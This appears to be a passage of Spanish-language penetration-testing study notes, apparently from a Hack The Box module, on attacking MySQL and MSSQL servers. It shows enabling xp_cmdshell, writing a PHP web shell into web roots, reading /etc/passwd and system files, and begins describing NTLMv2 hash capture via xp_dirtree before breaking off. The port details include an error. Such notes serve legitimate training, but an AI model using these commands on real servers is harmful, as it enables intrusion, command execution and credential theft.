> MySQL y Microsoft SQL Server (MSSQL) son sistemas de gestión de bases de datos relacionales que almacenan datos en tablas, columnas y filas. Muchos sistemas de bases de datos relacionales, como MSSQL y MySQL, utilizan el Lenguaje de Consulta Estructurado (SQL) para consultar y mantener la base de datos.

Por defecto, **MSSQL** usa los puertos TCP/1434 y UDP/1434, mientras que **MySQL** usa el puerto TCP/3306. Sin embargo, vuando MSSQL usa el modo oculto, utiliza el puerto TCP/2433.
### Conectando al servidor SQL
##### MySQL

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

##### Sqlcmd 

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

Si estamos accediendo a MSSQL desde Linux, podemos usar `sqsh` como una alternativa a `sqlcmd`

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

O bien 

```bash
amr251@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!
```

> Cuando usamos la Autenticación de Windows, necesitamos especificar el nombre del dominio o el nombre del host de la máquina de destino. Si no especificamos un dominio o nombre de host, se asumirá que estamos utilizando Autenticación SQL y se autentificará contra los usuarios creados en el servidor SQL. En cambio, si definimos el dominio o el nombre del host, se usará la Autenticación de Windows.

Si estamos apuntando a una cuenta local, podemos usar `NOMBRESERVIDOR\\nombrecuenta` o `.\nombrecuenta`. El comando completo se vería así:

```bash
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

**Esquemas/Bases de datos del sistema por defecto en MySQL:**

- **mysql**: es la base de datos del sistema que contiene tablas con información necesaria para el funcionamiento del servidor MySQL.    
- **information_schema**: proporciona acceso a los metadatos de las bases de datos.    
- **performance_schema**: es una característica para monitorear la ejecución del servidor MySQL a bajo nivel.    
- **sys**: un conjunto de objetos que ayuda a los administradores de bases de datos (DBAs) y desarrolladores a interpretar los datos recolectados por el _Performance Schema_

**Esquemas/Bases de datos del sistema por defecto en MSSQL:**

- **master**: guarda la información principal de una instancia de SQL Server.    
- **msdb**: utilizada por el _SQL Server Agent_.    
- **model**: base de datos plantilla que se copia cada vez que se crea una nueva base de datos.    
- **resource**: base de datos de solo lectura que contiene objetos del sistema visibles en todas las bases de datos del servidor dentro del esquema _sys_.    
- **tempdb**: almacena objetos temporales utilizados por las consultas SQL.

Si usamos `sqlcmd` tendremos que escribir `GO` después de nuestra query para ejecutarla:

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

##### Mostrar tablas con sqlcmd

```bash
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```

### Ejecución de comandos

MSSQL tiene procedimientos almacenados extendidos llamados **xp_cmdshell**, que nos permiten ejecutar comandos del sistema a través de SQL. Ten en cuenta lo siguiente sobre **xp_cmdshell**:

- **xp_cmdshell** es una función poderosa y está deshabilitada por defecto. Se puede habilitar o deshabilitar utilizando la _Administración Basada en Políticas (Policy-Based Management)_ o ejecutando el comando **sp_configure**.    
- El proceso de Windows que se genera mediante **xp_cmdshell** tiene los mismos permisos de seguridad que la cuenta de servicio del servidor SQL.    
- **xp_cmdshell** opera de forma **sincrónica**, es decir, el control no se devuelve al que lo invoca hasta que el comando del sistema se haya completado.

##### XP_CMDSHELL

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Si esto no está habilitado lo podemos habilitar (si tenemos los privilegios correspondientes) así:

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

### Escribir archivos locales

MySQL no tiene un procedimiento almacenado como **xp_cmdshell**, pero se puede lograr la ejecución de comandos si escribimos en una ubicación del sistema de archivos que permita ejecutar nuestros comandos.

Por ejemplo, supongamos que MySQL funciona en un servidor web basado en PHP u otros lenguajes como ASP.NET. Si contamos con los privilegios adecuados, podemos intentar escribir un archivo utilizando **SELECT INTO OUTFILE** en un directorio accesible del servidor web. Luego, podemos navegar hasta la ubicación del archivo desde el navegador y ejecutar los comandos contenidos en él.

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

En MySQL, una variable de sistema global llamada **secure_file_priv** limita el efecto de las operaciones de importación y exportación de datos, como las realizadas mediante las sentencias **LOAD DATA**, **SELECT … INTO OUTFILE** y la función **LOAD_FILE()**. Estas operaciones solo están permitidas para usuarios que tengan el privilegio **FILE**.

**secure_file_priv** puede configurarse de la siguiente manera:

- Si está **vacía**, la variable no tiene efecto, lo cual **no es una configuración segura**.    
- Si se establece con el **nombre de un directorio**, el servidor limita las operaciones de importación y exportación para que solo funcionen con archivos dentro de ese directorio. El directorio debe existir; el servidor no lo crea.    
- Si se establece en **NULL**, el servidor **desactiva completamente** las operaciones de importación y exportación.    

En el siguiente ejemplo, podemos ver que la variable **secure_file_priv** está vacía, lo que significa que podemos leer y escribir datos usando MySQL:

```shell-session
mysql> show variables like "secure_file_priv";
```

Para escribir archivos con MSSQL necesitamos habilitar `Ole Automation Procedures`, que requiere de privilegios de administrador, y entonces ejecutar algunos procedimientos para crear el archivo:

##### MSSQL- Habilitarlo

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

##### MSSQL - Crear un archivo

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Leer archivos locales

Por defecto, **MSSQL** permite la lectura de archivos en cualquier ubicación del sistema operativo a la que la cuenta del servicio de SQL Server tenga acceso de lectura. Podemos usar la siguiente consulta SQL para leer archivos:

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

##### MySQL - Leer archivos locales en MySQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
```

### Capturar hash del servicio MSSQL

En la sección sobre ataques a **SMB**, mencionamos que se puede crear un servidor SMB falso para robar hashes y aprovechar ciertas implementaciones predeterminadas del sistema operativo Windows.

De manera similar, también es posible **robar el hash de la cuenta de servicio de MSSQL** utilizando los procedimientos almacenados no documentados **xp_subdirs** o **xp_dirtree**. Estos procedimientos utilizan el protocolo SMB para obtener una lista de subdirectorios dentro de un directorio padre especificado del sistema de archivos.

Cuando usamos uno de estos procedimientos y lo apuntamos a nuestro servidor SMB falso, la funcionalidad de lectura de directorios forzará al servidor SQL a **autenticarse** con el servidor SMB, enviando así el **hash NTLMv2 de la cuenta de servicio** que está ejecutando el servidor SQL. Para que esto funcione, necesitamos primero lanzar `Responder` o `impacket-smbserver` y ejecutar los siguientes comandos